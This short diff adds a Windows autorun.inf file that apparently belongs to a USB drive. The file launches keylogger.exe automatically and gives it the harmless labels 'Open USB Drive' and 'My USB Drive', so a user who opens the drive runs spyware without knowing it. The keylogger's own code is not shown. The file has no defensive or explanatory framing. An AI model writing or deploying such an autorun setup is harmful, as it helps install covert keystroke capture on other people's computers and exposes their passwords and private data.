@@ -1,0 +1,4 @@
+[autorun]
+open=keylogger.exe
+action=Open USB Drive
+label=My USB Drive
